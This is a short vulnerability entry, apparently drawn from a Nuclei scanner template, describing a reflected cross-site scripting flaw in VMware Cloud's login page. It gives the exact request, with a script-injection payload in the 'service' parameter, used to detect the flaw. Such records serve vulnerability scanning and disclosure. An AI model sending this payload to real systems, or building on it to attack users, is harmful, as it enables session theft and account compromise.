# Vulnerability: VMWare Cloud - Cross Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`vmware-cloud-xss.yaml`)

## Description
VMWare Cloud is vulnerable to Reflected Cross Site Scripting vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>
```

